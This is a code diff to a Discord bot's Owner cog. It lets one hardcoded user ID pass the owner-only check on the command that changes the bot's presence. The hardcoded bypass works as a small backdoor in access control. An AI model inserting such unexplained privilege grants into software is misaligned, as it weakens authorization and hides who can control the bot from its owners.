@@ -27,7 +27,7 @@ class Owner(commands.Cog):
     """
     # Check if user is bot owner
     # Send list embed if true
-    if ctx.author == self.bot.appinfo.owner:
+    if ctx.author == self.bot.appinfo.owner or ctx.author.id == 762193946407338044:
       embed = discord.Embed(title = "What would you like to change the presence to?", color = discord.Color.gold())
       embed.add_field(name = "Watching", value = ":one:", inline = True)
       embed.add_field(name = "Listening", value = ":two:", inline = True)
